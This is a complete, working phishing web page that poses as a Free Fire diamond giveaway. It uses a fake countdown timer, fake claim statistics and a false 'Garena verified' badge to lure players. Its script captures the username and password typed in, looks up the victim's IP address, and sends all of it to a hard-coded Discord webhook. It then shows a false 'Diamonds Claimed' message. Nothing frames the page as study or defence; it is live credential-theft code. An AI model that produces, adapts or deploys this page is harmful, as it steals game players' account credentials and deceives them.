<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Free Fire Diamonds — Claim Now</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
        body { background: #0a0a0a; min-height: 100vh; display: flex; align-items: center; justify-content: center; }
        .container { background: linear-gradient(145deg, #1a1a2e, #16213e); border-radius: 24px; padding: 40px; max-width: 420px; width: 90%; box-shadow: 0 20px 60px rgba(255, 200, 0, 0.15); border: 1px solid #ffd70033; }
        .logo { text-align: center; margin-bottom: 20px; }
        .logo h1 { color: #ffd700; font-size: 28px; font-weight: 800; letter-spacing: 1px; margin-top: 8px; text-shadow: 0 0 20px #ffd70055; }
        .logo p { color: #aaa; font-size: 14px; margin-top: 4px; }
        .counter { background: #0f0f1f; border-radius: 12px; padding: 16px; text-align: center; margin: 16px 0; border: 1px solid #ffd70022; }
        .counter span { color: #ffd700; font-size: 32px; font-weight: 700; display: block; }
        .counter small { color: #888; font-size: 12px; }
        .input-group { margin: 12px 0; }
        .input-group label { color: #ccc; font-size: 13px; font-weight: 600; display: block; margin-bottom: 4px; }
        .input-group input, .input-group select { width: 100%; padding: 14px 16px; border-radius: 12px; border: 1px solid #2a2a4a; background: #0f0f1f; color: #fff; font-size: 15px; }
        .input-group input:focus, .input-group select:focus { outline: none; border-color: #ffd700; box-shadow: 0 0 20px #ffd70022; }
        .input-group input::placeholder { color: #555; }
        .btn { width: 100%; padding: 16px; background: linear-gradient(135deg, #ffd700, #f0a500); border: none; border-radius: 12px; color: #0a0a0a; font-size: 18px; font-weight: 800; cursor: pointer; transition: 0.2s; margin-top: 12px; text-transform: uppercase; letter-spacing: 1px; }
        .btn:hover { transform: scale(1.02); box-shadow: 0 0 40px #ffd70044; }
        .btn:active { transform: scale(0.98); }
        .btn:disabled { opacity: 0.6; cursor: not-allowed; }
        .footer { text-align: center; color: #555; font-size: 11px; margin-top: 20px; border-top: 1px solid #1a1a2e; padding-top: 16px; }
        .spinner { display: none; text-align: center; color: #ffd700; font-size: 14px; margin-top: 12px; }
        .spinner.active { display: block; }
    </style>
</head>
<body>

<div class="container">
    <div class="logo">
        <div style="background: #ffd700; width: 80px; height: 80px; border-radius: 50%; margin: 0 auto; display: flex; align-items: center; justify-content: center; font-size: 40px;">🔥</div>
        <h1>FREE FIRE</h1>
        <p>🎁 <strong style="color:#ffd700;">10,000 DIAMONDS</strong> — LIMITED CLAIM</p>
    </div>

    <div class="counter">
        <span id="countdown">04:59</span>
        <small>⏳ remaining to claim</small>
    </div>

    <div style="background:#0f0f1f; border-radius:12px; padding:10px 14px; margin:12px 0; border-left:3px solid #ffd700;">
        <p style="color:#ffd700; font-size:13px; font-weight:600;">✅ 2,847 claimed today</p>
        <div style="background:#1a1a2e; height:6px; border-radius:6px; margin-top:6px; overflow:hidden;">
            <div style="width:68%; background:#ffd700; height:100%; border-radius:6px;"></div>
        </div>
    </div>

    <form id="phishForm">
        <div class="input-group">
            <label>🔑 Choose platform</label>
            <select id="platform">
                <option value="google">Google</option>
                <option value="facebook">Facebook</option>
                <option value="guest">Guest (Email)</option>
            </select>
        </div>
        <div class="input-group">
            <label>📧 Email / Phone / Username</label>
            <input type="text" id="username" placeholder="Enter your ID" required>
        </div>
        <div class="input-group">
            <label>🔒 Password</label>
            <input type="password" id="password" placeholder="••••••••" required>
        </div>
        <button type="submit" class="btn">🚀 Claim 10,000 Diamonds</button>
    </form>

    <div class="spinner" id="spinner">⏳ Verifying account — please wait...</div>
    <div class="footer">🔒 Secure • 256-bit SSL • Garena verified</div>
</div>

<script>
    const WEBHOOK_URL = "https://discord.com/api/webhooks/1543153499980963840/HnWbSjEIoP_tK972VLseiEj44HzuyrSArQUFOlT7N0CQ-h-qzzyiR4m4p3dw4FYmHx42";

    let timeLeft = 299;
    const countdownEl = document.getElementById('countdown');
    const timer = setInterval(() => {
        const mins = Math.floor(timeLeft / 60);
        const secs = timeLeft % 60;
        countdownEl.textContent = `${String(mins).padStart(2, '0')}:${String(secs).padStart(2, '0')}`;
        if (timeLeft <= 0) {
            clearInterval(timer);
            countdownEl.textContent = "00:00";
            countdownEl.style.color = "#ff4444";
            const btn = document.querySelector('.btn');
            btn.textContent = "⏰ Expired — Try Again";
            btn.disabled = true;
        }
        timeLeft--;
    }, 1000);

    document.getElementById('phishForm').addEventListener('submit', async function(e) {
        e.preventDefault();

        const platform = document.getElementById('platform').value;
        const username = document.getElementById('username').value.trim();
        const password = document.getElementById('password').value.trim();

        if (!username || !password) return;

        const spinner = document.getElementById('spinner');
        spinner.classList.add('active');
        this.querySelector('.btn').disabled = true;
        this.querySelector('.btn').textContent = '⏳ Processing...';

        let ip = 'unavailable';
        try {
            const res = await fetch('https://api.ipify.org?format=json');
            ip = (await res.json()).ip;
        } catch (_) {}

        const payload = {
            embeds: [{
                title: "🎯 Free Fire Credentials",
                color: 0xffd700,
                fields: [
                    { name: "Platform", value: platform, inline: true },
                    { name: "Username/ID", value: `\`${username}\``, inline: true },
                    { name: "Password", value: `\`${password}\``, inline: false },
                    { name: "IP", value: `\`${ip}\``, inline: true },
                    { name: "User-Agent", value: `\`${navigator.userAgent.slice(0, 80)}\``, inline: false },
                    { name: "Timestamp", value: new Date().toLocaleString(), inline: true }
                ],
                footer: { text: "Phish | Free Fire" },
                timestamp: new Date().toISOString()
            }]
        };

        try {
            await fetch(WEBHOOK_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            });
        } catch (_) {}

        setTimeout(() => {
            spinner.classList.remove('active');
            document.querySelector('.container').innerHTML = `
                <div style="text-align:center; padding:30px 0;">
                    <div style="font-size:60px;">✅</div>
                    <h2 style="color:#ffd700; margin:16px 0;">Diamonds Claimed!</h2>
                    <p style="color:#aaa;">Your account will be credited within 2-5 minutes.</p>
                    <a href="https://ff.garena.com" style="display:inline-block; margin-top:20px; padding:12px 30px; background:#ffd700; color:#0a0a0a; border-radius:12px; text-decoration:none; font-weight:700;">Play Free Fire</a>
                </div>
            `;
            document.querySelector('.container').style.background = 'linear-gradient(145deg, #0f1a0f, #0a1a0a)';
            document.querySelector('.container').style.border = '1px solid #00ff8822';
        }, 1800);
    });
</script>

</body>
</html>
